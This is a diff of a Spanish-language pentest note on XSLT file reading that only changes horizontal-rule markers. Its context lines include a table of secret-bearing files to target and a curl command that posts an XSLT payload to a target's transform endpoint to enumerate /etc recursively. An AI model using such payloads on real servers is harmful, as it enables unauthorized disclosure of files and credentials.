@@ -18,7 +18,7 @@ linked:
 ---
 # XSLT - Lectura de Archivos (document)
 
-***
+---
 
 ## Función document()
 
@@ -52,7 +52,7 @@ linked:
 | Windows | `C:/inetpub/wwwroot/web.config` | Connection strings |
 | .NET | `appsettings.json` | Secrets |
 
-___
+---
 
 ## XXE dentro de XSLT
 
@@ -82,7 +82,7 @@ ___
 </xsl:stylesheet>
 ```
 
-___
+---
 
 ## Lectura de Directorios
 
@@ -99,4 +99,4 @@ ___
 | `curl -X POST --data '<xsl:for-each select="collection(&apos;file:///etc/?select=*.xml;recurse=yes&apos;)"><xsl:value-of select="document-uri(.)"/><xsl:text>&#10;</xsl:text></xsl:for-each>' https://target/transform \| sort -u` | Bulk XML files recursive enum | XML-config enum. |
 ^xslt-lfi-dirs
 
-***
+---
